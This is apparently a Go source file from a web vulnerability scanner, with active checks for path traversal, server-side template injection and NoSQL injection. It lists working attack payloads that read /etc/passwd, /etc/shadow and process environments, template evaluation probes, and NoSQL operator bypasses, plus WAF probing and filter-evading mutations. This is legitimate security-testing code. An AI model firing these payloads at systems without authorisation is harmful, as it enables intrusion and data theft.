package active

import (
	"context"
	"strings"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/diff"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// traversalSeeds are plain path expressions. Encoded forms are deliberately not
// listed: the mutation engine derives `%2e%2e%2f`, `....//` and the overlong
// UTF-8 variants from these, and listing them by hand would mean encoding an
// already-encoded payload.
var traversalSeeds = []string{
	"../../../../../../etc/passwd",
	"../../../../../../../../../../etc/passwd",
	"/etc/passwd",
	"../../../../etc/shadow",
	"../../../../../../proc/self/environ",
	"..\\..\\..\\..\\..\\windows\\win.ini",
	"..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
	"/windows/win.ini",
	"../../../../../../etc/passwd%00",
	// Path-normalisation confusion. Servers and their front-ends disagree about
	// what these resolve to, and a check that only tried `../` sequences would
	// miss an application that strips them correctly but collapses `//` badly.
	"//etc/passwd",
	"/.//etc/passwd",
	"/etc//passwd",
	"/./etc/passwd",
	"/etc/passwd/..;/etc/passwd",
	"/etc/./passwd",
}

// traversalSignatures are lines from the files a traversal targets. They appear
// essentially nowhere else, which is what makes a match conclusive.
var traversalSignatures = []string{
	"root:x:0:0",
	"daemon:x:1:1",
	"nobody:x:65534",
	"[boot loader]",
	"for 16-bit app support",
	"[fonts]",
	"[extensions]",
	"localhost",
}

// pathTraversal detects directory traversal and local file inclusion.
type pathTraversal struct{}

func (pathTraversal) ID() string                 { return "path-traversal" }
func (pathTraversal) TitleKey() i18n.Key         { return i18n.KeyCheckPathTraversalTitle }
func (pathTraversal) DescriptionKey() i18n.Key   { return i18n.KeyCheckPathTraversalDesc }
func (pathTraversal) RemediationKey() i18n.Key   { return i18n.KeyCheckPathTraversalFix }
func (pathTraversal) Severity() finding.Severity { return finding.SeverityHigh }
func (pathTraversal) Tags() []string {
	return []string{"active", "injection", "lfi", "owasp-top10"}
}
func (pathTraversal) Passive() bool { return false }

func (pathTraversal) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	baseline := strings.ToLower(string(t.Response.Body))
	c.ProbeWAF(ctx, t)

	var matched string
	attempt, err := c.SendVariants(ctx, t, payload.Traversal, "path-traversal", traversalSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
			matched = firstNewSignature(strings.ToLower(string(resp.Body)), baseline, traversalSignatures)
			return matched != ""
		})
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(pathTraversal{}, t,
		i18n.KeyCheckPathTraversalTitle, i18n.KeyCheckPathTraversalDesc, i18n.KeyCheckPathTraversalFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-22"
	f.References = []string{
		"https://owasp.org/www-community/attacks/Path_Traversal",
		"https://cwe.mitre.org/data/definitions/22.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{matched, variantNote(c, attempt)}
	f.Evidence.Diff = extractAround(string(attempt.Response.Body), matched, 240)
	return []*finding.Finding{f}
}

// sstiProduct is the value the injected arithmetic evaluates to. It is chosen so
// it will not appear by accident in a normal page, which is what makes a match
// mean the engine really evaluated the expression.
const sstiProduct = "3996001"

// sstiSeeds cover the delimiter syntaxes of the common template engines.
var sstiSeeds = []string{
	"{{1999*1999}}",
	"${1999*1999}",
	"#{1999*1999}",
	"<%= 1999*1999 %>",
	"*{1999*1999}",
	"@(1999*1999)",
	"${{1999*1999}}",
	"{{1999*'1999'}}",
	"{{\"1999\"*1999}}",
}

// ssti detects server-side template injection.
type ssti struct{}

func (ssti) ID() string                 { return "ssti" }
func (ssti) TitleKey() i18n.Key         { return i18n.KeyCheckSSTITitle }
func (ssti) DescriptionKey() i18n.Key   { return i18n.KeyCheckSSTIDesc }
func (ssti) RemediationKey() i18n.Key   { return i18n.KeyCheckSSTIFix }
func (ssti) Severity() finding.Severity { return finding.SeverityHigh }
func (ssti) Tags() []string             { return []string{"active", "injection", "ssti"} }
func (ssti) Passive() bool              { return false }

func (ssti) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	baseline := string(t.Response.Body)
	// A page that already contains the product cannot be used as evidence.
	if strings.Contains(baseline, sstiProduct) {
		return nil
	}
	c.ProbeWAF(ctx, t)

	attempt, err := c.SendVariants(ctx, t, payload.SSTI, "ssti", sstiSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
			return strings.Contains(string(resp.Body), sstiProduct)
		})
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(ssti{}, t,
		i18n.KeyCheckSSTITitle, i18n.KeyCheckSSTIDesc, i18n.KeyCheckSSTIFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-94"
	f.References = []string{
		"https://portswigger.net/web-security/server-side-template-injection",
		"https://cwe.mitre.org/data/definitions/94.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{
		attempt.Variant.Value + " evaluated to " + sstiProduct,
		variantNote(c, attempt),
	}
	f.Evidence.Diff = extractAround(string(attempt.Response.Body), sstiProduct, 240)
	return []*finding.Finding{f}
}

// Similarity thresholds for the NoSQL boolean oracle. Tight on purpose: the
// true branch has to be indistinguishable from the baseline and the false one
// clearly not.
const (
	nosqlTrueSimilarity  = 0.995
	nosqlFalseSimilarity = 0.98
)

// nosqlErrorSignatures are the errors MongoDB and friends produce.
//
// Every entry has to be wording the *server* produces, never something a payload
// contains. An earlier version listed `$where` and `errmsg`, which are MongoDB
// field names — and therefore strings the payloads themselves carry, so a target
// that echoed the input was reported as injecting it. The echo guard below would
// catch those too, but a signature that can never be evidence does not belong in
// the list.
var nosqlErrorSignatures = []string{
	"mongoerror",
	"mongo error",
	"mongoerror:",
	"invalid bson",
	"bsontypeerror",
	"jsonparseexception",
	"casting string to",
	"e11000 duplicate key",
	"unknown operator",
	"unknown top level operator",
	"validationerror",
	"cannot apply $",
	"failed to parse",
	"not authorized on",
}

// nosqlSeeds are plain expressions; the JSON and operator spellings a filter
// might miss are produced by mutation.
var nosqlSeeds = []string{
	`'"` + "`{",
	`'||'`,
	`' || '1'=='1`,
	`" || "1"=="1`,
	`{"$ne":null}`,
	`{"$gt":""}`,
	`{"$where":"1==1"}`,
	`';return true;var x='`,
	`{"username":{"$ne":null}}`,
}

// nosqli detects NoSQL injection, by error and by a boolean oracle.
type nosqli struct{}

func (nosqli) ID() string                 { return "nosqli" }
func (nosqli) TitleKey() i18n.Key         { return i18n.KeyCheckNoSQLTitle }
func (nosqli) DescriptionKey() i18n.Key   { return i18n.KeyCheckNoSQLDesc }
func (nosqli) RemediationKey() i18n.Key   { return i18n.KeyCheckNoSQLFix }
func (nosqli) Severity() finding.Severity { return finding.SeverityHigh }
func (nosqli) Tags() []string             { return []string{"active", "injection", "nosql"} }
func (nosqli) Passive() bool              { return false }

func (nosqli) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	baseline := strings.ToLower(string(t.Response.Body))
	c.ProbeWAF(ctx, t)

	// Error-based first: it is the cheapest and the most conclusive.
	var matched string
	attempt, err := c.SendVariants(ctx, t, payload.NoSQL, "nosqli", nosqlSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, variant payload.Variant) bool {
			// The payload is passed in so that a reflected value cannot be
			// mistaken for a parser complaint.
			matched = firstNewSignatureNotEchoed(
				strings.ToLower(string(resp.Body)), baseline, nosqlErrorSignatures, strings.ToLower(variant.Value))
			return matched != ""
		})
	if err == nil && attempt != nil {
		f := nosqlFinding(c, t, attempt.Request, attempt.Response, attempt.Variant.Value, matched)
		f.Evidence.Matches = append(f.Evidence.Matches, variantNote(c, attempt))
		return []*finding.Finding{f}
	}

	return nosqlBooleanOracle(ctx, c, t)
}

// nosqlBooleanOracle compares a true condition against a false one.
//
// It runs unmuted on purpose: a boolean oracle needs a matched pair of payloads
// that differ only in their truth value, and applying independent transformations
// to each half would break the comparison the conclusion rests on.
func nosqlBooleanOracle(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	base := c.BaselineFingerprint(t)
	if base == nil || base.NormLen == 0 {
		return nil
	}

	for _, pair := range [][2]string{
		{"' || '1'=='1", "' || '1'=='2"},
		{`" || "1"=="1`, `" || "1"=="2`},
	} {
		trueReq, trueResp, err := c.InjectEncoded(ctx, t, pair[0], checks.EncodeNone)
		if err != nil || trueResp == nil {
			continue
		}
		_, falseResp, err := c.InjectEncoded(ctx, t, pair[1], checks.EncodeNone)
		if err != nil || falseResp == nil {
			continue
		}

		simTrue := diff.CompareFingerprints(base, c.Fingerprint(trueResp)).Score
		simFalse := diff.CompareFingerprints(base, c.Fingerprint(falseResp)).Score
		simBetween := diff.CompareFingerprints(c.Fingerprint(trueResp), c.Fingerprint(falseResp)).Score
		if simTrue < nosqlTrueSimilarity || simFalse > nosqlFalseSimilarity || simBetween > nosqlFalseSimilarity {
			continue
		}

		f := nosqlFinding(c, t, trueReq, falseResp, pair[1], "boolean oracle")
		f.Confidence = finding.ConfidenceFirm
		f.Evidence.Diff = c.Bundle.T(i18n.KeyEvidenceBoolean, round3(simTrue), round3(simFalse), round3(simBetween))
		return []*finding.Finding{f}
	}
	return nil
}

// nosqlFinding builds a NoSQL injection finding.
func nosqlFinding(c *checks.Context, t *checks.Target, req *httpmsg.Request, resp *httpmsg.Response, injected, match string) *finding.Finding {
	f := checks.NewFinding(nosqli{}, t,
		i18n.KeyCheckNoSQLTitle, i18n.KeyCheckNoSQLDesc, i18n.KeyCheckNoSQLFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = injected
	f.CWE = "CWE-943"
	f.References = []string{"https://cwe.mitre.org/data/definitions/943.html"}
	f.Evidence.Request = req.Raw()
	f.Evidence.Response = truncate(resp.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{match}
	return f
}
